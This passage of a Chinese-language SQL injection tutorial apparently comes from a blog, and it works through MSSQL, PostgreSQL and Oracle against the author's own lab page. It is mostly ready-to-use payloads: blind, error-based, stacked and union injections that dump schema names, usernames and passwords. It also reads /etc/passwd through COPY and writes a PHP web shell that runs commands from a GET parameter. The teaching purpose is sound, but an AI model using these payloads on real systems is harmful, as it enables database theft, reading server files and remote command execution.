+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> ascii(<span class="hljs-built_in">substring</span>((<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> name <span class="hljs-keyword">from</span> master.dbo.sysdatabases),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">=</span><span class="hljs-number">109</span><br></code></pre></td></tr></table></figure>
+<p>布尔盲注没有mysql那么多姿势，大同小异截取字符串比较</p>
+<h2 id="2-9-时间盲注"><a href="#2-9-时间盲注" class="headerlink" title="2-9-时间盲注"></a>2.9 时间盲注</h2>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span>;if (<span class="hljs-keyword">select</span> IS_SRVROLEMEMBER(<span class="hljs-string">&#x27;sysadmin&#x27;</span>))<span class="hljs-operator">=</span><span class="hljs-number">1</span> WAITFOR DELAY <span class="hljs-string">&#x27;0:0:5&#x27;</span><br></code></pre></td></tr></table></figure>
+<p><code>waitfor delay '0:0:5'</code>是mssql的延时语法</p>
+<p>同样可以用字符串截取来延时注入</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span>;if (ascii(<span class="hljs-built_in">substring</span>((<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> name <span class="hljs-keyword">from</span> master.dbo.sysdatabases),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)))<span class="hljs-operator">&gt;</span><span class="hljs-number">1</span> WAITFOR DELAY <span class="hljs-string">&#x27;0:0:5&#x27;</span><br></code></pre></td></tr></table></figure>
+<h1>0x03 PostgreSQL</h1>
+<h2 id="3-1-环境搭建"><a href="#3-1-环境搭建" class="headerlink" title="3-1-环境搭建"></a>3.1 环境搭建</h2>
+<p>这里比较建议用docker搭建（如果不赶时间的话），我这里也是懒得搭建了，依旧是跟着文章走一遍</p>
+<h2 id="3-2-验证注入"><a href="#3-2-验证注入" class="headerlink" title="3-2-验证注入"></a>3.2 验证注入</h2>
+<p>index.php?uid=1 AND 1=1 运行正常</p>
+<p>index.php?uid=1 AND 1=2 运行异常</p>
+<h2 id="3-3-报错注入"><a href="#3-3-报错注入" class="headerlink" title="3-3-报错注入"></a>3.3 报错注入</h2>
+<p>这里也没去查，猜测是cast函数将select查询出的数据转换为了as语句后面的numeric数字型，导致报错</p>
+<p><strong>获取版本号：</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> tbuser <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> <span class="hljs-number">7778</span><span class="hljs-operator">=</span><span class="hljs-built_in">CAST</span>((<span class="hljs-keyword">SELECT</span> version())::text <span class="hljs-keyword">AS</span> <span class="hljs-type">NUMERIC</span>)<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='image-20231015100908578.png'><img src="image-20231015100908578.png" alt="image-20231015100908578"></p>
+<p><strong>获取 Schemas 名称</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> tbuser <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> <span class="hljs-number">7778</span><span class="hljs-operator">=</span><span class="hljs-built_in">CAST</span>((<span class="hljs-keyword">SELECT</span> schemaname <span class="hljs-keyword">FROM</span> pg_tables limit <span class="hljs-number">1</span>)::text <span class="hljs-keyword">AS</span> <span class="hljs-type">NUMERIC</span>)<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='image-20231015100921512.png'><img src="image-20231015100921512.png" alt="image-20231015100921512"></p>
+<h2 id="3-4-时间盲注"><a href="#3-4-时间盲注" class="headerlink" title="3-4-时间盲注"></a>3.4 时间盲注</h2>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">AND</span> <span class="hljs-number">6489</span><span class="hljs-operator">=</span>(<span class="hljs-keyword">SELECT</span> <span class="hljs-number">6489</span> <span class="hljs-keyword">FROM</span> PG_SLEEP(<span class="hljs-number">5</span>)) <span class="hljs-operator">/</span><span class="hljs-operator">/</span>延时 <span class="hljs-number">5</span> 秒<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='image-20231015101251875.png'><img src="image-20231015101251875.png" alt="image-20231015101251875"></p>
+<h2 id="3-5-堆叠注入"><a href="#3-5-堆叠注入" class="headerlink" title="3-5-堆叠注入"></a>3.5  堆叠注入</h2>
+<p>（多语句查询，stacked queries）</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?uid<span class="hljs-operator">=</span><span class="hljs-number">1</span>;<span class="hljs-keyword">select</span> PG_SLEEP(<span class="hljs-number">5</span>)<span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='image-20231015101324281.png'><img src="image-20231015101324281.png" alt="image-20231015101324281"></p>
+<h2 id="3-6-联合注入"><a href="#3-6-联合注入" class="headerlink" title="3-6-联合注入"></a>3.6 联合注入</h2>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql">?uid<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> 运行正常<br><br>?uid<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span> 运行异常，获取字段数 <span class="hljs-number">3</span><br><br>?uid<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">ALL</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">NULL</span>,(<span class="hljs-string">&#x27;11111&#x27;</span>),<span class="hljs-keyword">NULL</span><span class="hljs-comment">-- 查看是否输出 11111</span><br></code></pre></td></tr></table></figure>
+<p>这里依旧是NULL而不用数字占用</p>
+<p class='item-img' data-src='image-20231015101436309.png'><img src="image-20231015101436309.png" alt="image-20231015101436309"></p>
+<p class='item-img' data-src='image-20231015101455053.png'><img src="image-20231015101455053.png" alt="image-20231015101455053"></p>
+<p class='item-img' data-src='image-20231015101502110.png'><img src="image-20231015101502110.png" alt="image-20231015101502110"></p>
+<p>获取数据库结构和内容，此处均为联合查询</p>
+<h4 id="获取模式名称（schemaname）名称"><a href="#获取模式名称（schemaname）名称" class="headerlink" title="获取模式名称（schemaname）名称"></a>获取模式名称（schemaname）名称</h4>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?uid<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">NULL</span>,<span class="hljs-built_in">COALESCE</span>(<span class="hljs-built_in">CAST</span>(schemaname <span class="hljs-keyword">AS</span> <span class="hljs-type">CHARACTER</span>(<span class="hljs-number">10000</span>)),(CHR(<span class="hljs-number">32</span>))),<span class="hljs-keyword">NULL</span> <span class="hljs-keyword">FROM</span> pg_tables<span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure>
+<p>语法解析：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">COALESCE(expression[,n]) coalesce 函数返回参数（列名）中第一个非 NULL 值的字段值，注意不是为空&#x27;&#x27;<br><br>cast (&#x27;1&#x27; as numeric) 1 转换为数字类型<br></code></pre></td></tr></table></figure>
+<p>简化：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?uid<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">NULL</span>,schemaname,<span class="hljs-keyword">NULL</span> <span class="hljs-keyword">FROM</span> pg_tables<span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='image-20231015101622775.png'><img src="image-20231015101622775.png" alt="image-20231015101622775"></p>
+<p>用户创建的数据库默认模式名称（schemaname）为 public</p>
+<h3 id="获取数据表名称"><a href="#获取数据表名称" class="headerlink" title="获取数据表名称"></a>获取数据表名称</h3>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">uid<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">ALL</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">NULL</span>,tablename,<span class="hljs-keyword">NULL</span> <span class="hljs-keyword">FROM</span> pg_tables <span class="hljs-keyword">WHERE</span> schemaname <span class="hljs-keyword">IN</span> (<span class="hljs-string">&#x27;public&#x27;</span>)<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='image-20231015101656967.png'><img src="image-20231015101656967.png" alt="image-20231015101656967"></p>
+<h3 id="获取表字段名称"><a href="#获取表字段名称" class="headerlink" title="获取表字段名称"></a>获取表字段名称</h3>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?uid<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">NULL</span>,attname,<span class="hljs-keyword">NULL</span> <span class="hljs-keyword">FROM</span> pg_namespace,pg_type,pg_attribute b <span class="hljs-keyword">JOIN</span> pg_class a <span class="hljs-keyword">ON</span> a.oid<span class="hljs-operator">=</span>b.attrelid <span class="hljs-keyword">WHERE</span> a.relnamespace<span class="hljs-operator">=</span>pg_namespace.oid <span class="hljs-keyword">AND</span> pg_type.oid<span class="hljs-operator">=</span>b.atttypid <span class="hljs-keyword">AND</span> attnum<span class="hljs-operator">&gt;</span><span class="hljs-number">0</span> <span class="hljs-keyword">AND</span> a.relname<span class="hljs-operator">=</span><span class="hljs-string">&#x27;tbuser&#x27;</span> <span class="hljs-keyword">AND</span> nspname<span class="hljs-operator">=</span><span class="hljs-string">&#x27;public&#x27;</span>—<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='image-20231015101747879.png'><img src="image-20231015101747879.png" alt="image-20231015101747879"></p>
+<h3 id="获取表内容"><a href="#获取表内容" class="headerlink" title="获取表内容"></a>获取表内容</h3>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?uid<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">ALL</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">NULL</span>,id<span class="hljs-operator">||</span><span class="hljs-string">&#x27;,&#x27;</span><span class="hljs-operator">||</span>username<span class="hljs-operator">||</span><span class="hljs-string">&#x27;,&#x27;</span><span class="hljs-operator">||</span>passwd,<span class="hljs-keyword">NULL</span> <span class="hljs-keyword">FROM</span> public.tbuser<span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='image-20231015101838101.png'><img src="image-20231015101838101.png" alt="image-20231015101838101"></p>
+<p><strong>测列数：</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">4</span><br><span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span><br></code></pre></td></tr></table></figure>
+<p><strong>测显位：第 2，3</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;null&#x27;</span>,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span> 错误<br><span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span>,<span class="hljs-string">&#x27;null&#x27;</span>,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span> 正常<br><span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>,<span class="hljs-string">&#x27;null&#x27;</span>,<span class="hljs-keyword">null</span> 正常<br><span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>,<span class="hljs-string">&#x27;null&#x27;</span> 错误<br></code></pre></td></tr></table></figure>
+<p><strong>获取信息：</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">null</span>,version(),<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span><br><span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">null</span>,<span class="hljs-built_in">current_user</span>,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span><br><span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span>,current_database(),<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span><br></code></pre></td></tr></table></figure>
+<p><strong>获取数据库名：</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span>,string_agg(datname,<span class="hljs-string">&#x27;,&#x27;</span>),<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span> <span class="hljs-keyword">from</span> pg_database<br></code></pre></td></tr></table></figure>
+<p><strong>获取表名：</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span>、<span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span>,string_agg(tablename,<span class="hljs-string">&#x27;,&#x27;</span>),<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span> <span class="hljs-keyword">from</span> pg_tables <span class="hljs-keyword">where</span> schemaname<span class="hljs-operator">=</span><span class="hljs-string">&#x27;public&#x27;</span><br><br><span class="hljs-number">2</span>、<span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span>,string_agg(relname,<span class="hljs-string">&#x27;,&#x27;</span>),<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span> <span class="hljs-keyword">from</span> pg_stat_user_tables<br></code></pre></td></tr></table></figure>
+<p><strong>获取列名：</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span>,string_agg(column_name,<span class="hljs-string">&#x27;,&#x27;</span>),<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span> <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;reg_users&#x27;</span><br></code></pre></td></tr></table></figure>
+<p><strong>获取数据：</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span>,string_agg(username,<span class="hljs-string">&#x27;,&#x27;</span>)<span class="hljs-keyword">from</span> reg_users<br></code></pre></td></tr></table></figure>
+<h2 id="3-7-文件或目录操作"><a href="#3-7-文件或目录操作" class="headerlink" title="3-7-文件或目录操作"></a>3.7 文件或目录操作</h2>
+<p>PostgreSQL 中部分内置函数、表</p>
+<p class='item-img' data-src='image-20231015101911527.png'><img src="image-20231015101911527.png" alt="image-20231015101911527"></p>
+<h3 id="列目录——只能列安装目录下的文件"><a href="#列目录——只能列安装目录下的文件" class="headerlink" title="列目录——只能列安装目录下的文件"></a>列目录——只能列安装目录下的文件</h3>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?uid<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">NULL</span>,<span class="hljs-keyword">NULL</span>,pg_ls_dir(<span class="hljs-string">&#x27;./&#x27;</span>)<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='image-20231015101929944.png'><img src="image-20231015101929944.png" alt="image-20231015101929944"></p>
+<h3 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h3>
+<p>这里是堆叠注入，注意分号</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?uid<span class="hljs-operator">=</span><span class="hljs-number">1</span>;<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> passwd(t TEXT);<span class="hljs-keyword">COPY</span> passwd <span class="hljs-keyword">FROM</span> <span class="hljs-string">&#x27;/etc/passwd&#x27;</span>;<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">NULL</span>,t,<span class="hljs-keyword">NULL</span> <span class="hljs-keyword">FROM</span> passwd;<br></code></pre></td></tr></table></figure>
+<p>将要查询的数据放进了新建的t表，并最终读取</p>
+<p class='item-img' data-src='image-20231015102053878.png'><img src="image-20231015102053878.png" alt="image-20231015102053878"></p>
+<h3 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h3>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?uid<span class="hljs-operator">=</span><span class="hljs-number">1</span>;<span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> pass;（这里需要为数据库存在的表）<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> hacktb (t TEXT);<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> hacktb(t) <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">&#x27;&lt;?php @system(&quot;$_GET[cmd]&quot;);?&gt;&#x27;</span>);<span class="hljs-keyword">COPY</span> hacktb(t) <span class="hljs-keyword">TO</span> <span class="hljs-string">&#x27;/tmp/hack.php&#x27;</span>;<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='image-20231015102125008.png'><img src="image-20231015102125008.png" alt="image-20231015102125008"></p>
+<p class='item-img' data-src='image-20231015102132894.png'><img src="image-20231015102132894.png" alt="image-20231015102132894"></p>
+<h1>0x04 Oracle</h1>
+<h2 id="4-1-基本概念"><a href="#4-1-基本概念" class="headerlink" title="4-1-基本概念"></a>4.1 基本概念</h2>
+<p>Oracle和MySQL数据库语法大致相同，结构不太相同。<strong>最大的一个特点就是oracle可以调用Java代码。</strong></p>
+<p>对于“数据库”这个概念而言，Oracle采用了”表空间“的定义。数据文件就是由多个表空间组成的，这些数据文件和相关文件形成一个完整的数据库。当数据库创建时，Oracle 会默认创建五个表空间：SYSTEM、SYSAUX、USERS、UNDOTBS、TEMP：</p>
+<ol>
+<li>SYSTEM：看名字就知道这个用于是存储系统表和管理配置等基本信息</li>
+<li>SYSAUX：类似于 SYSTEM，主要存放一些系统附加信息，以便减轻 SYSTEM 的空间负担</li>
+<li>UNDOTBS：用于事务回退等</li>
+<li>TEMP：作为缓存空间减少内存负担</li>
+<li>USERS：就是存储我们定义的表和数据</li>
+</ol>
+<p>​		在Oracle中每个表空间中均存在一张dual表，这个表是虚表，并没有实际的存储意义，它永远只存储一条数据，因为Oracle的SQL语法要求select后必须跟上from，所以我们通常使用dual来作为计算、查询时间等SQL语句中from之后的虚表占位，也就是<code>select 1+1 from dual</code>。</p>
+<p>再来看Oracle中用户和权限划分：Oracle 中划分了许多用户权限，权限的集合称为角色。例如 CONNECT 角色具有连接到数据库权限，RESOURCE 能进行基本的增删改查，DBA 则集合了所有的用户权限。在创建数据库时，会默认启用 sys、system 等用户：</p>
+<ol>
+<li>sys：相当于 Linux 下的 root 用户。为 DBA 角色</li>
+<li>system：与 sys 类似，但是相对于 sys 用户，无法修改一些关键的系统数据，这些数据维持着数据库的正常运行。为 DBA 角色。</li>
+<li>public：public 代指所有用户（everyone），对其操作会应用到所有用户上（实际上是所有用户都有 public 用户拥有的权限，如果将 DBA 权限给了 public，那么也就意味着所有用户都有了 DBA 权限）</li>
+</ol>
+<h2 id="4-2-基本语法"><a href="#4-2-基本语法" class="headerlink" title="4-2-基本语法"></a>4.2 基本语法</h2>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-keyword">column</span>, group_function(<span class="hljs-keyword">column</span>)<br><span class="hljs-keyword">from</span> <span class="hljs-keyword">table</span><br>[<span class="hljs-keyword">where</span> <span class="hljs-keyword">condition</span>]<br>[<span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> group_by_expression]<br>[<span class="hljs-keyword">having</span> group_condition]<br>[<span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-keyword">column</span>];<br></code></pre></td></tr></table></figure>
+<p>Oracle要求select后必须指明要查询的表名，可以用dual。</p>
+<p>Oracle使用 <code>||</code> 拼接字符串，MySQL中为或运算。</p>
+<p class='item-img' data-src='image-20231015104356973.png'><img src="image-20231015104356973.png" alt="image-20231015104356973"></p>
+<p>单引号和双引号在Oracle中虽然都是字符串，但是双引号可以用来消除关键字，比如<code>sysdate</code>。</p>
+<p>Oracle中limit应该使用虚表中的rownum字段通过where条件判断。</p>
+<p class='item-img' data-src='image-20231015104406502.png'><img src="image-20231015104406502.png" alt="image-20231015104406502"></p>
+<p>Oracle中没有空字符，<code>''</code>和’null’都是null，而MySQL中认为<code>''</code>仍然是一个字符串。</p>
+<p>Oracle对数据格式要求严格，比如<code>union select</code>的时候，放到下文讲。</p>
+<p>Oracle的系统表：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">- dba_tables : 系统里所有的表的信息，需要DBA权限才能查询<br>- all_tables : 当前用户有权限的表的信息<br>- user_tables: 当前用户名下的表的信息<br>- DBA_ALL_TABLES：DBA 用户所拥有的或有访问权限的对象和表<br>- ALL_ALL_TABLES：某一用户拥有的或有访问权限的对象和表<br>- USER_ALL_TABLES：某一用户所拥有的对象和表<br></code></pre></td></tr></table></figure>
+<p><strong>DBA_TABLES &gt;= ALL_TABLES &gt;= USER_TABLES</strong></p>
+<h2 id="4-3-信息搜集"><a href="#4-3-信息搜集" class="headerlink" title="4-3-信息搜集"></a>4.3 信息搜集</h2>
+<p>从现在开始，我们以注入点<code>http://localhost:8080/oracleInject/index?username=admin</code>为例讲解。代码随便写一个jsp网页就行了。</p>
+<p class='item-img' data-src='image-20231015104625343.png'><img src="image-20231015104625343.png" alt="image-20231015104625343"></p>
+<p>获取数据库版本信息</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>localhost:<span class="hljs-number">8080</span><span class="hljs-operator">/</span>oracleInject<span class="hljs-operator">/</span>index?username<span class="hljs-operator">=</span>admin<span class="hljs-string">&#x27; union select 1,&#x27;</span>a<span class="hljs-string">&#x27;,(SELECT banner FROM v$version WHERE banner LIKE &#x27;</span>Oracle<span class="hljs-operator">%</span><span class="hljs-number">25</span><span class="hljs-string">&#x27;) from dual -- +</span><br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='image-20231015105016112.png'><img src="image-20231015105016112.png" alt="image-20231015105016112"></p>
+<p>获取操作系统版本信息</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>localhost:<span class="hljs-number">8080</span><span class="hljs-operator">/</span>oracleInject<span class="hljs-operator">/</span>index?username<span class="hljs-operator">=</span>admin<span class="hljs-string">&#x27; union select 1,&#x27;</span>a<span class="hljs-string">&#x27;,(SELECT banner FROM v$version where banner like &#x27;</span>TNS<span class="hljs-operator">%</span><span class="hljs-number">25</span><span class="hljs-string">&#x27;) from dual -- +</span><br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='image-20231015105053990.png'><img src="image-20231015105053990.png" alt="image-20231015105053990"></p>
+<p>获取当前数据库</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>localhost:<span class="hljs-number">8080</span><span class="hljs-operator">/</span>oracleInject<span class="hljs-operator">/</span>index?username<span class="hljs-operator">=</span>admin<span class="hljs-string">&#x27; union select 1,&#x27;</span>a<span class="hljs-string">&#x27;,(SELECT name FROM v$database) from dual -- +</span><br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='image-20231015105110814.png'><img src="image-20231015105110814.png" alt="image-20231015105110814"></p>
+<p>获取数据库用户</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">FROM</span> dual;<br></code></pre></td></tr></table></figure>
+<p>获取所有数据库用户</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> username <span class="hljs-keyword">FROM</span> all_users;<br><span class="hljs-keyword">SELECT</span> name <span class="hljs-keyword">FROM</span> sys.user$; <span class="hljs-comment">-- 需要高权限</span><br></code></pre></td></tr></table></figure>
+<p>获取当前用户权限</p>
